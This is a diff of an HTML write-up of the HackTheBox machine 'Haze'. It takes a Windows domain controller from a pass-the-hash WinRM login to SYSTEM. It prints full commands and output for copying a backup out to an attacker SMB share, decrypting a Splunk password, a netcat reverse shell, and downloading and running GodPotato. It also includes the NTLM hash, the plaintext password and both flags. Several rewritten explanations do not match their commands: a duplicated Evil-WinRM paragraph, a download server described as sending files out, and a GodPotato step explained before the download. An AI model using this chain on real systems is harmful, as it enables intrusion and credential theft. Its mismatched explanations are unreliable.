 09e0b3eeb2e7a6b0d419e9ff8f4d91af</code></pre></div>
-      <h4 class="writeup-step-title">LOGIN As Edward</h4>
+      <h3 class="writeup-sub-title">User Flag as Edward</h3>
       <div class="code-block"><pre><code>evil-winrm -i dc01.haze.htb -u edward.martin -H &quot;09e0b3eeb2e7a6b0d419e9ff8f4d91af&quot;
- 
+                                        
 Evil-WinRM shell v3.7
- 
+                                        
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline
- 
+                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
- 
+                                        
 Info: Establishing connection to remote endpoint</code></pre></div>
-      <h4 class="writeup-step-title">Getting the User Flag</h4>
-      <div class="flag-box">
-  <span class="flag-label">🚩 User Flag</span>
-  <code class="flag-value">196679afa11655872130aaef4e7a1bfa</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\edward.martin&gt; cd Desktop
 *Evil-WinRM* PS C:\Users\edward.martin\Desktop&gt; ls
 
 
- Directory: C:\Users\edward.martin\Desktop
+    Directory: C:\Users\edward.martin\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--ar--- 4/14/2025 6:54 PM 34 user.txt
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         4/14/2025   6:54 PM             34 user.txt
 
 
 *Evil-WinRM* PS C:\Users\edward.martin\Desktop&gt; type user.txt
 196679afa11655872130aaef4e7a1bfa</code></pre></div>
-      <p>I went inside the windows machine to see what I could find after getting the user flag. I fell on the backups directory. Within this directory you have a subdir Splunk and within this subdirectory you have a zip file.</p>
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">196679afa11655872130aaef4e7a1bfa</code></div>
+      <h2 class="writeup-section-title">Privilege Escalation: Splunk Backup Decryption & GodPotato</h2>
+      <h3 class="writeup-sub-title">Splunk Backup Discovery</h3>
+      <p>On the Windows machine, I discover a <code>C:\backups\splunk</code> directory containing a Splunk backup ZIP. I exfiltrate it to my Kali machine using an SMB server.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\&gt; cd backups
 *Evil-WinRM* PS C:\backups&gt; ls
 
 
- Directory: C:\backups
+    Directory: C:\backups
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
-d----- 3/5/2025 12:33 AM Splunk
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          3/5/2025  12:33 AM                Splunk
 
 
 *Evil-WinRM* PS C:\backups&gt; cd splunk
 *Evil-WinRM* PS C:\backups\splunk&gt; ls
 
 
- Directory: C:\backups\splunk
+    Directory: C:\backups\splunk
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--a---- 8/6/2024 3:22 PM 27445566 splunk_backup_2024-08-06.zip</code></pre></div>
-      <p>I will first have to download the File from the windows machine to my own linux machine. This so that I can then unzip this folder and check that there is no interesting data in it. I will download the folder using the following command.</p>
-      <p>Downloading the file from the windows machine was not as easy as it seemed. So for this I started doing the following by using the following command. I will go through the command below to make the /tmp folder a share folder so I can go download the file to my own PC. I was able to find this by using ChatGPT.</p>
-      <p>On my own kali linux machine</p>
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip</code></pre></div>
+      <p>I use Impacket's <code>smbserver.py</code> to create a temporary SMB share on my Kali machine. This allows the target Windows machine to copy files to my share using standard Windows commands like <code>copy</code> or <code>xcopy</code>. The <code>-smb2support</code> flag ensures compatibility with modern Windows versions that require SMBv2.</p>
       <div class="code-block"><pre><code>impacket-smbserver share /tmp -smb2support
 \Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -985,16 +684,17 @@ Mode LastWriteTime Length Name
 [*] Disconnecting Share(1:IPC$)
 [*] Disconnecting Share(2:share)
 [*] Closing down connection (10.129.232.50,62409)</code></pre></div>
-      <p>On windows machine</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\backups\splunk&gt; copy C:\backups\splunk\splunk_backup_2024-08-06.zip \\10.10.16.21\share</code></pre></div>
-      <p>File is now downloaded on the linux machine, unzip the file.</p>
+      <p>I extract the compressed archive using the appropriate decompression tool (<code>tar</code> for .tar.bz2, <code>unzip</code> for .zip). The extracted contents may include backup files, configuration data, or user directories containing flags and sensitive information.</p>
       <div class="code-block"><pre><code>──(kali㉿kali)-[/tmp]
-└─$ unzip splunk_backup_2024-08-06.zip 
-Archive: splunk_backup_2024-08-06.zip
- creating: Splunk/
- creating: Splunk/bin/
- inflating: Spl</code></pre></div>
-      <p>I went to look up where that you can find the passwords in a saved Splunk folder. I then went to look and found the following.</p>
+└─$ unzip splunk_backup_2024-08-06.zip                       
+Archive:  splunk_backup_2024-08-06.zip
+   creating: Splunk/
+   creating: Splunk/bin/
+  inflating: Spl</code></pre></div>
+      <h3 class="writeup-sub-title">Decrypting Splunk Stored Credentials</h3>
+      <p>Splunk stores encrypted passwords in <code>passwd</code> files within its configuration snapshot. I locate the encrypted credentials and decrypt them using <code>splunksecrets</code>, which reads the <code>splunk.secret</code> key file from the backup.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[/tmp/…/confsnapshot/baseline_local/system/local]
 └─$ cat authentication.conf 
 [default]
@@ -1032,28 +732,29 @@ userNameAttribute = samaccountname
 
 [authentication]
 authSettings =</code></pre></div>
-      <p>So now I will start looking for splunk to decrypt the passwords. For this I will use splunksecrets. I will specify the path from where the secret file of splunk will be within the folder we just downloaded from the windows server. The Ciphertext I will use is the one I just found in the authenication.conf file.</p>
+      <p>I execute this command from my Kali attacker machine. The output provides crucial information about the target's configuration that will guide the next steps of the exploitation chain.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Haze]
 └─$ splunksecrets splunk-decrypt -S /tmp/Splunk/etc/auth/splunk.secret
 Ciphertext: $1$YDz8WfhoCWmf6aTRkA+QqUI=
 Sp1unkadmin@2k24</code></pre></div>
-      <p>As you can see above, we have found a password. I will use this password to log into the splunk webpage. I will now look for an exploit now that I am able to log into the webserver. I will use the following exploit https://github.com/0xjpuff/reverse_shell_splunk to connect to the windows machine by starting a listener.</p>
+      <h3 class="writeup-sub-title">Reverse Shell as alexander.green</h3>
+      <p>The decrypted password provides access to a Splunk deployment server running as <code>alexander.green</code>. I use the Splunk RCE exploit to get a reverse shell.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.21] from (UNKNOWN) [10.129.232.50] 61836
 
 PS C:\Windows\system32&gt;</code></pre></div>
-      <p>I will first go and check which user I am logged in with. I will go and do this by using the following command.</p>
+      <p>I run <code>whoami</code> to confirm which user account the current session is running as. This is an essential verification step after every lateral movement or privilege escalation to ensure the attack succeeded and to understand the security context for the next phase.</p>
       <div class="code-block"><pre><code>PS C:\Users\alexander.green\AppData\Local\Temp&gt; whoami
 haze\alexander.green</code></pre></div>
-      <p>Now I went to see what groups alexander.green is all in.</p>
+      <p>I run <code>whoami /all</code> to display the complete security context: username, SID, group memberships, and all assigned privileges. This comprehensive view reveals whether the user has dangerous privileges like <strong>SeImpersonatePrivilege</strong>, <strong>SeBackupPrivilege</strong>, or <strong>SeRestorePrivilege</strong> — each of which has known escalation techniques.</p>
       <div class="code-block"><pre><code>PS C:\Windows\system32&gt; whoami /all
 
 USER INFORMATION
 ----------------
 
-User Name SID 
+User Name            SID                                        
 ==================== ===========================================
 haze\alexander.green S-1-5-21-323145914-28650650-2368316563-1106
 
@@ -1061,32 +762,32 @@ haze\alexander.green S-1-5-21-323145914-28650650-2368316563-1106
 GROUP INFORMATION
 -----------------
 
-Group Name Type SID Attributes 
+Group Name                                 Type             SID                                         Attributes                                        
 ========================================== ================ =========================================== ==================================================
-Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group
-CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group
-LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group
-HAZE\Splunk_Admins Group S-1-5-21-323145914-28650650-2368316563-1108 Mandatory group, Enabled by default, Enabled group
-Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group
-Mandatory Label\High Mandatory Level Label S-1-16-12288 
+Everyone                                   Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                     Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                     Mandatory group, Enabled by default, Enabled group
+HAZE\Splunk_Admins                         Group            S-1-5-21-323145914-28650650-2368316563-1108 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                  
 
 
 PRIVILEGES INFORMATION
 ----------------------
 
-Privilege Name Description State 
+Privilege Name                Description                               State   
 ============================= ========================================= ========
-SeMachineAccountPrivilege Add workstations to domain Disabled
-SeChangeNotifyPrivilege Bypass traverse checking Enabled 
-SeImpersonatePrivilege Impersonate a client after authentication Enabled 
-SeCreateGlobalPrivilege Create global objects Enabled 
-SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 
 USER CLAIMS INFORMATION
@@ -1095,40 +796,34 @@ USER CLAIMS INFORMATION
 User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.</code></pre></div>
-      <p>Above we can see that we have impersonate privileges and that we can pretend to be the administrator and then go into the root.txt file. I will do this by using the following tool.</p>
-      <p>Using the following documentation on godpotato. https://medium.com/@iamkumarraj/godpotato-empowering-windows-privilege-escalation-techniques-400b88403a71</p>
-      <p>I am going to use the following command to go to the temp folder. Inside the temp folder you will be able to download the GodPotato because outside the temp folder you cannot download it.</p>
+      <h3 class="writeup-sub-title">GodPotato (SeImpersonatePrivilege)</h3>
+      <p>The user <code>alexander.green</code> has <strong>SeImpersonatePrivilege</strong>. I upload <strong>GodPotato-NET4.exe</strong> and use it to execute a command as SYSTEM, reading the root flag.</p>
       <div class="code-block"><pre><code>PS C:\&gt; cd $env:TEMP</code></pre></div>
-      <p>So I first went to download the app from the following link https://github.com/BeichenDream/GodPotato/releases?source=post_page-----400b88403a71---------------------------------------
-After I downloaded the application, I went to the downloads folder because that&#x27;s where the application is. From there I went to set up a connection so that from the windows machine I could download the application.</p>
+      <p>I start a Python HTTP server (<code>python3 -m http.server</code>) to serve files from the target machine back to my attacker machine. This is a quick and reliable method for exfiltrating files when SSH/SCP isn't available — simply browsing to the target's IP and port from my machine downloads the file.</p>
       <div class="code-block"><pre><code>python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.129.100.204 - - [15/Apr/2025 23:10:25] &quot;GET /GodPotato-NET4.exe HTTP/1.1&quot; 200 -
 10.129.100.204 - - [15/Apr/2025 23:13:59] &quot;GET /GodPotato-NET4.exe HTTP/1.1&quot; 200 -</code></pre></div>
-      <p>I started downloading the application by using the following command.</p>
+      <p>I execute <strong>GodPotato</strong> to exploit the <code>SeImpersonatePrivilege</code>, running the specified command as SYSTEM.</p>
       <div class="code-block"><pre><code>PS C:\Users\alexander.green\AppData\Local\Temp&gt; curl http://10.10.16.24:8000/GodPotato-NET4.exe -O GodPotato-NET4.exe
 PS C:\Users\alexander.green\AppData\Local\Temp&gt; ls
 
 
- Directory: C:\Users\alexander.green\AppData\Local\Temp
+    Directory: C:\Users\alexander.green\AppData\Local\Temp
 
 
-Mode LastWriteTime Length Name 
----- ------------- ------ ---- 
--a---- 4/15/2025 6:52 PM 57344 GodPotato-NET4.exe 
--a---- 4/15/2025 6:23 PM 1049 tmp5eftqaul 
--a---- 4/15/2025 6:31 PM 1049 tmpa718abo3 
--a---- 4/15/2025 5:59 PM 1051 tmpabfnrqc1 
--a---- 4/15/2025 6:08 PM 1049 tmpckz2b0vo 
--a---- 4/15/2025 6:20 PM 1049 tmpd1ti3j7z 
--a---- 4/15/2025 6:04 PM 1051 tmppk7hzva8 
--a---- 4/15/2025 6:46 PM 1049 tmpxsloeou6</code></pre></div>
-      <p>By using the following command, I was able to pretend to be the administrator and thus see the root.txt file or root flag.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 Root Flag</span>
-  <code class="flag-value">6c11cf0dbce91eb0023ea17733da5d59</code>
-</div>
-      <div class="code-block"><pre><code>PS C:\Users\alexander.green\AppData\Local\Temp&gt; .\GodPotato-NET4.exe -cmd &quot;cmd /c type c:\users\Administrator\Desktop\root.txt&quot; 
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         4/15/2025   6:52 PM          57344 GodPotato-NET4.exe                                                   
+-a----         4/15/2025   6:23 PM           1049 tmp5eftqaul                                                          
+-a----         4/15/2025   6:31 PM           1049 tmpa718abo3                                                          
+-a----         4/15/2025   5:59 PM           1051 tmpabfnrqc1                                                          
+-a----         4/15/2025   6:08 PM           1049 tmpckz2b0vo                                                          
+-a----         4/15/2025   6:20 PM           1049 tmpd1ti3j7z                                                          
+-a----         4/15/2025   6:04 PM           1051 tmppk7hzva8                                                          
+-a----         4/15/2025   6:46 PM           1049 tmpxsloeou6</code></pre></div>
+      <p>I execute <strong>GodPotato</strong> to exploit the <code>SeImpersonatePrivilege</code>, running the specified command as SYSTEM.</p>
+      <div class="code-block"><pre><code>PS C:\Users\alexander.green\AppData\Local\Temp&gt; .\GodPotato-NET4.exe -cmd &quot;cmd /c type c:\users\Administrator\Desktop\root.txt&quot;        
 [*] CombaseModule: 0x140735297748992
 [*] DispatchTable: 0x140735300340040
 [*] UseProtseqFunction: 0x140735299631936
@@ -1149,18 +844,17 @@ Mode LastWriteTime Length Name
 [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
 [*] CurrentsImpersonationLevel: Impersonation
 [*] Start Search System Token
-[*] PID : 936 Token:0x776 User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] PID : 936 Token:0x776  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
 [*] Find System Token : True
 [*] UnmarshalObject: 0x80070776
 [*] CurrentUser: NT AUTHORITY\SYSTEM
 [*] process start with pid 5352
 6c11cf0dbce91eb0023ea17733da5d59
 PS C:\Users\alexander.green\AppData\Local\Temp&gt;</code></pre></div>
-      <h4 class="writeup-step-title">ROOTED</h4>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250415214303.png" alt="Pasted image 20250415214303.png" loading="lazy" /><span class="img-caption">Pasted image 20250415214303.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">6c11cf0dbce91eb0023ea17733da5d59</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250415214303.png" alt="Machine rooted via GodPotato" loading="lazy" /><span class="img-caption">Machine rooted via GodPotato</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
